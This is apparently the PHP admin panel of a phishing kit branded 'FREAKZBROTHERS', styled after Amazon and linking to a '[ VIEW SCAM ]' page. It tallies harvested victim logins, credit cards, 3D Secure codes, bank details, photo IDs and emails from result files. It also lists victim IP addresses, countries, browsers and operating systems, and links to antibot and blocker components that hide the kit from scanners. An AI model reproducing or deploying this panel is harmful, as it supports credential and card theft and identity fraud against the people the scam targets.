<?php
error_reporting(0);
session_start();
date_default_timezone_set("Asia/Jakarta");
include '../main.php';
include "../blocker.php";
if (!isset($_SESSION['user'])) {
  header("location: login.php");
}
$click = "../result/total_click.txt";
$file = fopen($click, "r");
$total_click = fread($file, filesize($click));
$total_click = substr_count($total_click, "\n");
fclose($file);
if($total_click == 0) {
    $total_click = "$total_click";
}else{
    $total_click = "$total_click";
}

$click = "../result/total_login.txt";
$file = fopen($click, "r");
$total_login = fread($file, filesize($click));
$total_login = substr_count($total_login, "\n");
fclose($file);
if($total_login == 0) {
    $total_login = "$total_login";
}else{
    $total_login = "$total_login";
}

$click = "../result/total_cc.txt";
$file = fopen($click, "r");
$total_cc = fread($file, filesize($click));
$total_cc = substr_count($total_cc, "\n");
fclose($file);
if($total_cc == 0) {
    $total_cc = "$total_cc";
}else{
    $total_cc = "$total_cc";
}

$click = "../result/total_vbv.txt";
$file = fopen($click, "r");
$total_vbv = fread($file, filesize($click));
$total_vbv = substr_count($total_vbv, "\n");
fclose($file);
if($total_vbv == 0) {
    $total_vbv = "$total_vbv";
}else{
    $total_vbv = "$total_vbv";
}

$click = "../result/total_bank.txt";
$file = fopen($click, "r");
$total_bank = fread($file, filesize($click));
$total_bank = substr_count($total_bank, "\n");
fclose($file);
if($total_bank == 0) {
    $total_bank = "$total_bank";
}else{
    $total_bank = "$total_bank";
}

$click = "../result/total_photocc.txt";
$file = fopen($click, "r");
$total_photo = fread($file, filesize($click));
$total_photo = substr_count($total_photo, "\n");
fclose($file);
if($total_photo == 0) {
    $total_photo = "$total_photo";
}else{
    $total_photo = "$total_photo";
}

$click = "../result/total_photoid.txt";
$file = fopen($click, "r");
$total_photoid = fread($file, filesize($click));
$total_photoid = substr_count($total_photoid, "\n");
fclose($file);
if($total_photoid == 0) {
    $total_photoid = "$total_photoid";
}else{
    $total_photoid = "$total_photoid";
}

$click = "../result/total_email.txt";
$file = fopen($click, "r");
$total_email = fread($file, filesize($click));
$total_email = substr_count($total_email, "\n");
fclose($file);
if($total_email == 0) {
    $total_email = "$total_email";
}else{
    $total_email = "$total_email";
}

$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$total_botnya = fread($file, filesize($click));
$total_botnya = substr_count($total_botnya, "\n");
fclose($file);
if($total_botnya == 0) {
    $total_botnya = "$total_botnya";
}else{
    $total_botnya = "$total_botnya";
}

$click = "../result/visitor.txt";
$file = fopen($click, "r");
$visitor = fread($file, filesize($click));
fclose($file);

$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$log_bot = fread($file, filesize($click));
fclose($file);

$click = "../result/total_bin.txt";
$file = fopen($click, "r");
$log_bin = fread($file, filesize($click));
fclose($file);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <link rel="apple-touch-icon" sizes="76x76" href="img/apple-icon.png">
  <link rel="icon" type="image/png" href="img/favicon.png">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <title>FREAKZBROTHERS - PANEL</title>
  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700,200" rel="stylesheet" />
  <script src="https://kit.fontawesome.com/a2ddabd525.js" crossorigin="anonymous"></script>
  <link href="css/bootstrap.min.css" rel="stylesheet" />
  <link href="css/paper-dashboard.css?v=2.0.0" rel="stylesheet" />
  <link href="demo/demo.css" rel="stylesheet" />
</head>

<body class="">
  <div class="wrapper ">
    <div class="sidebar" data-color="black" data-active-color="danger">
      <div class="logo">
        <a href="#" class="simple-text logo-mini">
            <font style="font-size:32px;"><i class="fab fa-amazon"></i></font>
        </a>
        <a href="index.php" class="simple-text logo-normal">
          <strong>FREAKZBROTHERS</strong>
        </a>
      </div>
      <div class="sidebar-wrapper">
        <ul class="nav">
          <li class="active ">
            <a href="index.php">
              <i class="fas fa-chart-bar"></i>
              <p>Statistic</p>
            </a>
          </li>
          <li>
            <a href="setting.php">
              <i class="fas fa-cogs"></i>
              <p>Settings</p>
            </a>
          </li>
          <li>
            <a href="antibot.php">
              <i class="fas fa-robot"></i>
              <p>Antibot</p>
            </a>
          </li>
          <li>
            <a href="reset.php">
              <i class="fas fa-trash-alt"></i>
              <p>Reset Logs</p>
            </a>
          </li>
          <li>
            <a href="logout.php">
              <i class="fas fa-sign-out-alt"></i>
              <p>Log Out</p>
            </a>
          </li>
        </ul>
      </div>
    </div>
    <div class="main-panel">
      <!-- Navbar -->
      <nav class="navbar navbar-expand-lg navbar-absolute fixed-top navbar-transparent">
        <div class="container-fluid">
          <div class="navbar-wrapper">
            <div class="navbar-toggle">
              <button type="button" class="navbar-toggler">
              </button>
            </div>
            <a class="navbar-brand" href="#"><strong><font style="font-family:tahoma;">STATISTIC</font></strong></a>
          </div>
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-controls="navigation-index" aria-expanded="false" aria-label="Toggle navigation">
          </button>
          <div class="collapse navbar-collapse justify-content-end" id="navigation">
            <ul class="navbar-nav">
              <li class="nav-item">
                <a class="nav-link btn-rotate" href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?= $parameter ?>" target="_blank">
                  <p><strong>[ VIEW SCAM ]</strong></p>
                </a>
              </li>
            </ul>
          </div>
        </div>
      </nav>
      <div class="content">
        <div class="row">
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="card card-stats">
              <div class="card-body ">
                <div class="row">
                  <div class="col-5 col-md-3">
                    <div class="icon-big text-center icon-warning">
                      <i class="fas fa-users text-warning"></i>
                    </div>
                  </div>
                  <div class="col-7 col-md-8">
                    <div class="numbers">
                      <p class="card-category">VISITORS</p>
                      <p class="card-title"><?php echo $total_click ?>
                        <p>
                    </div>
                  </div>
                </div>
              </div>
              <div class="card-footer ">
                <hr>
              </div>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="card card-stats">
              <div class="card-body ">
                <div class="row">
                  <div class="col-5 col-md-4">
                    <div class="icon-big text-center icon-warning">
                      <i class="fas fa-sign-in-alt text-success"></i>
                    </div>
                  </div>
                  <div class="col-7 col-md-8">
                    <div class="numbers">
                      <p class="card-category">LOGIN</p>
                      <p class="card-title"><?php echo $total_login ?>
                        <p>
                    </div>
                  </div>
                </div>
              </div>
              <div class="card-footer ">
                <hr>
              </div>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="card card-stats">
              <div class="card-body ">
                <div class="row">
                  <div class="col-5 col-md-4">
                    <div class="icon-big text-center icon-warning">
                      <i class="fas fa-credit-card text-danger"></i>
                    </div>
                  </div>
                  <div class="col-7 col-md-8">
                    <div class="numbers">
                      <p class="card-category">CREDIT CARD</p>
                      <p class="card-title"><?php echo $total_cc ?>
                        <p>
                    </div>
                  </div>
                </div>
              </div>
              <div class="card-footer ">
                <hr>
              </div>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="card card-stats">
              <div class="card-body ">
                <div class="row">
                  <div class="col-5 col-md-4">
                    <div class="icon-big text-center icon-warning">
                      <i class="fab fa-cc-visa text-primary"></i>
                    </div>
                  </div>
                  <div class="col-7 col-md-8">
                    <div class="numbers">
                      <p class="card-category">3DSECURE</p>
                      <p class="card-title"><?php echo $total_vbv ?>
                        <p>
                    </div>
                  </div>
                </div>
              </div>
              <div class="card-footer ">
                <hr>
              </div>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="card card-stats">
              <div class="card-body ">
                <div class="row">
                  <div class="col-5 col-md-4">
                    <div class="icon-big text-center icon-warning">
                      <i class="fas fa-id-card text-danger"></i>
                    </div>
                  </div>
                  <div class="col-7 col-md-8">
                    <div class="numbers">
                      <p class="card-category">PAP ID</p>
                      <p class="card-title"><?php echo $total_photoid ?>
                        <p>
                    </div>
                  </div>
                </div>
              </div>
              <div class="card-footer ">
                <hr>
              </div>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="card card-stats">
              <div class="card-body ">
                <div class="row">
                  <div class="col-5 col-md-4">
                    <div class="icon-big text-center icon-warning">
                      <i class="fas fa-university text-primary"></i>
                    </div>
                  </div>
                  <div class="col-7 col-md-8">
                    <div class="numbers">
                      <p class="card-category">BANK</p>
                      <p class="card-title"><?php echo $total_bank ?>
                        <p>
                    </div>
                  </div>
                </div>
              </div>
              <div class="card-footer ">
                <hr>
              </div>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="card card-stats">
              <div class="card-body ">
                <div class="row">
                  <div class="col-5 col-md-4">
                    <div class="icon-big text-center icon-warning">
                      <i class="fas fa-envelope text-warning"></i>
                    </div>
                  </div>
                  <div class="col-7 col-md-8">
                    <div class="numbers">
                      <p class="card-category">EMAILS</p>
                      <p class="card-title"><?php echo $total_email ?>
                        <p>
                    </div>
                  </div>
                </div>
              </div>
              <div class="card-footer ">
                <hr>
              </div>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="card card-stats">
              <div class="card-body ">
                <div class="row">
                  <div class="col-5 col-md-4">
                    <div class="icon-big text-center icon-warning">
                      <i class="fas fa-bug text-dark"></i>
                    </div>
                  </div>
                  <div class="col-7 col-md-8">
                    <div class="numbers">
                      <p class="card-category">BOTs</p>
                      <p class="card-title"><?php echo $total_botnya ?>
                        <p>
                    </div>
                  </div>
                </div>
              </div>
              <div class="card-footer ">
                <hr>
              </div>
            </div>
          </div>
        </div>
        <div class="row">
          <div class="col-md-12">
            <div class="card ">
              <div class="card-header ">
                <h5 class="card-title"><strong>VISITOR LOGS ( <font style="color:red;display:inline-block;"><?php echo $total_click ?></font> )</strong></h5>
              </div>
              <div class="card-body ">
                <div class="table-responsive">
                <table class="table">
                  <thead class="text-danger">
                    <tr>
                      <td><strong>TIME</strong></td>
                      <td><strong>IP ADDRESS</strong></td>
                      <td><strong>COUNTRY</strong></td>
                      <td><strong>BROWSER</strong></td>
                      <td><strong>OS</strong></td>
                    </tr>
                  </thead>
                  <tbody>
                    <?php
                      if (file_exists("../result/log_visitor.txt")) {
                        $bit = file_get_contents("../result/log_visitor.txt");
                        $bit = explode("\n", $bit);
                        $con = count($bit);
                        foreach ($bit as $freakz) {
                          $freakz = explode("|", $freakz);
                          $time = $freakz[1];
                          $ip = $freakz[2];
                          $countryname = $freakz[3];
                          $br = $freakz[4];
                          $os = $freakz[5];
                          if ($ip == "") {
                            
                          } else {
                            echo "<tr>
                            <td>".$time."</td>
                                    <td>".$ip."</td>
                                    <td>".$countryname."</td>
                                    <td>".$br."</td>
                                    <td>".$os."</td>
                                    </tr>";
                          }
                        } 
                      } else {
                          echo "<tr><td>Not found</td><td></td><td></td><td></td><td></td></tr>";
                        }
                    ?>
                  </tbody>
                </table>
              </div>
              </div>
              <div class="card-footer ">
              </div>
            </div>
          </div>
        </div>
        <div class="row">
        </div>
      </div>
      <footer class="footer footer-black  footer-white ">
        <div class="container-fluid">
          <div class="row">
            <div class="credits ml-auto">
              <span class="copyright">
                ©
                <script>
                  document.write(new Date().getFullYear())
                </script>, made with <i class="fa fa-heart heart"></i> by FREAKZBROTHERS
              </span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  </div>
  <!--   Core JS Files   -->
  <script src="js/core/jquery.min.js"></script>
  <script src="js/core/popper.min.js"></script>
  <script src="js/core/bootstrap.min.js"></script>
  <script src="js/plugins/perfect-scrollbar.jquery.min.js"></script>
  <!--  Google Maps Plugin    -->
  <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY_HERE"></script>
  <!-- Chart JS -->
  <script src="js/plugins/chartjs.min.js"></script>
  <!--  Notifications Plugin    -->
  <script src="js/plugins/bootstrap-notify.js"></script>
  <!-- Control Center for Now Ui Dashboard: parallax effects, scripts for the example pages etc -->
  <script src="js/paper-dashboard.min.js?v=2.0.0" type="text/javascript"></script>
  <!-- Paper Dashboard DEMO methods, don't include it in your project! -->
  <script src="demo/demo.js"></script>
  <script>
    $(document).ready(function() {
      // Javascript method's body can be found in assets/assets-for-demo/js/demo.js
      demo.initChartsPages();
    });
  </script>
</body>

</html>